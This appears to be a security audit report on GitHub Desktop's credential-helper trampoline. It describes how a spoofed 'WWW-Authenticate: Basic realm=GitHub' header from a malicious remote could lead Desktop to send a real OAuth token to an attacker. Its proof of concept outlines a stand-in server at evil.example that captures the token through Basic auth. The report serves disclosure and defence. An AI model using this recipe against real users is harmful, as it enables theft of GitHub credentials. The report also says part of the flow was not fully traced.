### Title
Spoofable `WWW-Authenticate` realm header lets a malicious git remote trick Desktop into exfiltrating a real GitHub token via the credential-helper trampoline - (File: `app/src/lib/trampoline/trampoline-credential-helper.ts`)

### Summary
The credential-helper trampoline decides whether a git host should be treated as a trusted GitHub/GitHub Enterprise endpoint (and therefore be offered a stored/sign-in-derived account token) partly based on the `WWW-Authenticate` realm string returned by the remote server itself. That value is fully attacker-controlled when the remote is a malicious server, so an attacker-controlled git remote can make Desktop classify itself as "enterprise", drive the user through a real GitHub sign-in prompt, and then hand the resulting genuine OAuth token back to git, which sends it straight to the attacker's server as Basic-auth credentials.

### Finding Description
`getEndpointKind` in `app/src/lib/trampoline/trampoline-credential-helper.ts` classifies the credential endpoint using several checks, one of which trusts the raw HTTP response header captured by git and forwarded to Desktop: [1](#0-0) 

```
// When Git attempts to authenticate with a host it captures any
// WWW-Authenticate headers and forwards them to the credential helper. We
// use them as a happy-path to determine if the host is a GitHub host...
for (const [k, v] of cred.entries()) {
  if (k.startsWith('wwwauth[')) {
    if (v.includes('realm="GitHub"')) {
      return 'enterprise'
    } ...
```

This header is part of the HTTP response from the remote git server (or any man-in-the-middle proxy sitting on that connection), i.e. it is data the attacker who controls the remote fully controls. There is no verification that the host is an actual GitHub Enterprise instance (e.g., via a known allow-list, TLS certificate check, or a round-trip API probe) before trusting this classification.

Once `getEndpointKind` returns `'enterprise'`, `getCredential` treats the request as a GitHub authentication request rather than a generic one: [2](#0-1) 

Because the attacker's endpoint won't match any existing signed-in account, the `!accounts.some(...)` branch fires and Desktop calls `ui.promptForGitHubSignIn(endpoint)` — offering the user what looks like a legitimate "sign in to GitHub" flow triggered by what they believe is a normal fetch/clone/push operation. If the user completes that sign-in (a real OAuth flow against the genuine GitHub/GHE host), the resulting **real** account token is merged into the credential via `credWithAccount` and returned to git: [3](#0-2) [4](#0-3) 

Git then uses that credential to authenticate against the original remote — the attacker-controlled server — sending the real OAuth token as the HTTP Basic-auth password. The corrupted value is the *endpoint-kind classification* (`getEndpointKind`'s return value), which should only ever be derived from data Desktop itself controls or independently verifies (known GitHub/GHE hostnames, or a positive `isGitHubHost` API probe), not from a header value that is trivially forged by the very server being authenticated against.

### Impact Explanation
This lets an attacker who merely stands up a malicious git HTTP remote (or intercepts/relays git's HTTP session, e.g. via a compromised proxy or DNS/route trickery not requiring local access) obtain a legitimate, live GitHub OAuth token belonging to the victim by:
1. Getting the victim to add/clone/fetch from the attacker's remote (a routine, un-suspicious git operation, not "unnatural user steps").
2. Returning a 401 with `WWW-Authenticate: Basic realm="GitHub"` on the git smart-HTTP handshake.
3. Riding the credential prompt Desktop shows through its normal, legitimate GitHub sign-in UI.
4. Receiving the resulting real token as it is replayed back to the attacker's server by git's HTTP Basic auth.

This is credential/token exfiltration achieved purely through server-controlled response content — squarely in the accepted impact category ("git remote/proxy response... credential/token exfiltration").

### Likelihood Explanation
Exploitation requires only that the victim performs an ordinary git network operation (clone/fetch/push) against a repository hosted or proxied by the attacker — no local access, no pre-existing malware, and no unusual user behavior beyond the sign-in prompt that Desktop itself presents as a normal part of its workflow. The `WWW-Authenticate` header is standard content any HTTP server can set. The only extra step required of the user is completing a sign-in dialog that superficially looks legitimate because it does perform a real OAuth flow against real GitHub — increasing believability rather than requiring social-engineering assumptions.

### Recommendation
Do not trust the `WWW-Authenticate` realm content by itself to promote an endpoint to `'enterprise'`/`'github.com'` status. At minimum:
- Require this signal to be corroborated by an independent check (e.g., only accept it as a hint that should still be validated with the existing `isGitHubHost(endpoint)` API probe, rather than as a standalone `return 'enterprise'`).
- Before handing back a real account token for an endpoint that isn't an already-verified account endpoint, warn the user explicitly that they are about to send GitHub-authenticated-account credentials to a host they've never signed in to before (similar to a certificate-mismatch style warning), rather than silently reusing the freshly obtained OAuth token for an arbitrary third-party host.

### Proof of Concept
1. Stand up an HTTP server at `https://evil.example/victim/repo.git` implementing just enough of the git smart-HTTP protocol to trigger authentication, responding to the initial info/refs request with `401` and header `WWW-Authenticate: Basic realm="GitHub"`.
2. Have the victim run `git clone https://evil.example/victim/repo.git` from within GitHub Desktop (e.g., via "Clone repository" or "Add existing repository" pointed at that URL, or a crafted `x-github-client://openrepo/...` deep link parsed by `app/src/lib/parse-app-url.ts`).
3. Desktop's trampoline credential helper receives the `wwwauth[...]` header in the credential map, `getEndpointKind` returns `'enterprise'` per the code above.
4. Desktop shows a "Sign in to GitHub" prompt (`ui.promptForGitHubSignIn`); the victim completes the real OAuth flow.
5. The resulting token is placed into the credential returned to git, and git immediately performs `GET https://evil.example/victim/repo.git/info/refs` (and subsequent requests) with `Authorization: Basic base64(login:token)`, delivering the real token to the attacker's server.

Note: the exact runtime behavior of `ui.promptForGitHubSignIn` (whether it always requests a fresh token vs. can reuse an already cached enterprise session) was not fully traced in this pass due to tool-call limits; the classification flaw in `getEndpointKind` (trusting a server-supplied header to gate GitHub-host treatment) is confirmed directly from source and is the root broken invariant regardless of that detail.
